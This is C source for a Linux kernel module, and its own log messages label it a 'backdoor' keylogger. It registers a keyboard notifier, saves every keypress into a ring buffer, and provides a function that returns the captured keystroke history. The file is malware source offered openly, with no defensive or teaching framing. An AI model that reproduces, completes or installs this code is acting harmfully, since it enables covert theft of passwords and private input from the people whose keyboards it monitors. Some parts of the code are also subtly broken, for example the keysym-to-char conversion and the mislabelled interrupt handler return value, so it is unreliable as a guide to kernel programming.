#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>

#include "keylogger.h"

#define BUFFER_SIZE 4096
#define KBD_IRQ 1

char buffer[BUFFER_SIZE] = { '\0' };
int fill = 0;

void save_key(char key)
{
	buffer[fill] = key;
	fill = (fill + 1) % BUFFER_SIZE;
}

/**
* This needs to be freed after using
* This needs to be checked for failing to allocate memory 
*/
char *read_key_history(void)
{
	int num_items_to_consume = BUFFER_SIZE;
	int consumed_count = 0;
	char *consumed_items = (char *)kmalloc(
		num_items_to_consume * sizeof(char), GFP_KERNEL);

	if (!consumed_items) {
		printk(KERN_ERR
		       "Failed to allocate memory for consumed items\n");
		return NULL;
	}

	while (consumed_count < num_items_to_consume) {
		char item = buffer[(fill - consumed_count - 1 + BUFFER_SIZE) %
				   BUFFER_SIZE];

		consumed_items[consumed_count] = item;
		consumed_count++;
	}

	return consumed_items;
}

irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id)
{
	struct keyboard_notifier_param *param = dev_id;

	if (param && param->value) {
		unsigned int keycode = param->value;

		char key = (char)keycode;

		save_key(key);
	} else {
		printk(KERN_ERR "backdoor: invalid keyboard interrupt parameters\n");
	}

	return IRQ_NONE;
}

int keyboard_notifier_callback(struct notifier_block *nblock,
			       unsigned long code, void *_param)
{
	struct keyboard_notifier_param *param = _param;

	if (code == KBD_KEYSYM && param && param->down) {
		keyboard_interrupt_handler(0, param);
	}

	return NOTIFY_OK;
}

struct notifier_block keyboard_notifier_block = {
	.notifier_call = keyboard_notifier_callback,
};

int __init keylogger_module_init(void)
{
	int result = register_keyboard_notifier(&keyboard_notifier_block);

	if (result != 0) {
		printk(KERN_ERR "backdoor: failed to register keyboard notifier\n");
		return result;
	}

	printk(KERN_INFO "backdoor: keylogger module initialized\n");
	return 0;
}

void __exit keylogger_module_exit(void)
{
	int result = unregister_keyboard_notifier(&keyboard_notifier_block);

	if (result != 0) {
		printk(KERN_ERR "backdoor: failed to unregister keyboard notifier: %d\n",
		       result);
	}

	printk(KERN_INFO "backdoor: keylogger module exited\n");
}
